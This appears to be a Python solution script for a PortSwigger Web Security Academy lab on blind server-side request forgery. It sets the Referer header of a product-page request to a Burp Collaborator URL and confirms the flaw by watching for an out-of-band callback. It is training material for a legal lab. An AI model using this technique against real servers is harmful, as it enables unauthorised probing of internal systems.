"""
Lab 3: Blind SSRF with out-of-band detection
https://portswigger.net/web-security/ssrf/blind/lab-blind-ssrf-with-out-of-band-detection
Difficulty: Practitioner

📝 No reflection — a request header (commonly Referer, sent by an internal
analytics system that processes traffic server-side) silently triggers a
server-side fetch to that URL. Confirm purely via Collaborator interaction.
"""

from utils import get_session, log, note

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"
COLLABORATOR_URL = "http://YOUR-COLLABORATOR-ID.oastify.com"


def run():
    s = get_session()

    note("Visiting a normal product page with Referer set to our Collaborator")
    note("URL — the lab's internal analytics bot fetches whatever's in Referer.")

    r = s.get(f"{TARGET}/product?productId=1", headers={"Referer": COLLABORATOR_URL})
    log(f"Status: {r.status_code} (expect a completely normal-looking response)")

    note("Check Burp Collaborator for an incoming interaction — that alone")
    note("confirms the SSRF, no in-band evidence needed or expected.")


if __name__ == "__main__":
    run()
